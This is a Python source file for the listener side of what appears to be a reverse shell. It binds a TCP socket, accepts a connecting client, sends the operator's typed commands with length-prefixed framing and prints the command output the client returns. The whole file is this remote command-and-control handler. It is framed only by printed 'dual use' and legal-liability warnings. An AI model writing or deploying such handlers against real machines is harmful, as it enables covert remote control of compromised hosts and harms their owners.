import socket
import struct

# This must be edited
HOST = '127.0.0.1'
PORT = 9999

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

def start_server():
    try:
        # Binding the server
        server_socket.bind((HOST, PORT))
        server_socket.listen(1)
        print(f"[+] Successfully created a server, listening on {HOST}:{PORT}")
        print("[!] WARNING: This is a dual use program, please use it in authorized access, author isn't responsible for any unethical uses.")
        print("[!] WARNING: You can face legal consequences for unethical uses, you have BEEN warned.")

        connect()
    except KeyboardInterrupt:
        print("[*] Quiting...")
        server_socket.close()
        exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")

def connect():
    while True:
        try:
            client_socket, client_address = server_socket.accept()
            print(f"[+] Successfully connected to {client_address}")
            command_loop(client_socket)
            client_socket.close()
        except KeyboardInterrupt:
            print("[*] Quiting...")
            client_socket.close()
            server_socket.close()
            exit(1)
        except ConnectionRefusedError:
            print("[!] Connection have been refused.")
            print("[*] Waiting for another client connection.")
        except Exception as e:
            print(f"[!] Error: {e}")

def receive_fixed_size(client_socket, size):
    data = b""
    while len(data) < size:
        try:
            packet = client_socket.recv(size - len(data))
            if not packet: return None
            data += packet
        except socket.timeout:
            continue
    return data

def command_input(client_socket, data):
    while True:
        print(data.decode('utf-8') + ">", end="")
        command = input().strip()
        if not command:
            pass
        elif command.upper() == "QUITING":
            client_socket.close()
            server_socket.close()
            exit(1)
        elif command:
            break
    return command

def send_fixed_header(client_socket, command):
    try:
        header = struct.pack('!I', len(command))
        client_socket.sendall(header)
    except Exception as e:
        print(f"[!] Error: {e}")

def send_fixed_data(client_socket, command):
    try:
        client_socket.sendall(command.encode('utf-8'))
    except Exception as e:
        print(f"[!] Error: {e}")

def command_loop(client_socket):
    while True:
        try:
            header = receive_fixed_size(client_socket, 4)
            if not header:
                break
            length = struct.unpack('!I', header)[0]
            data = receive_fixed_size(client_socket, length)

            command = command_input(client_socket, data)
            send_fixed_header(client_socket, command)
            send_fixed_data(client_socket, command)

            length = receive_fixed_size(client_socket, 4)
            if not length: break
            output_length = struct.unpack('!I', length)[0]
            output_bytes = receive_fixed_size(client_socket, output_length)
            output = output_bytes.decode('utf-8')

            print(output)
            
        except Exception as e:
            print(f"[!] Error: {e}")
        except KeyboardInterrupt:
            print("[*] Quiting...")
            client_socket.close()
            server_socket.close()
            exit(1)

if __name__ == "__main__":
    start_server()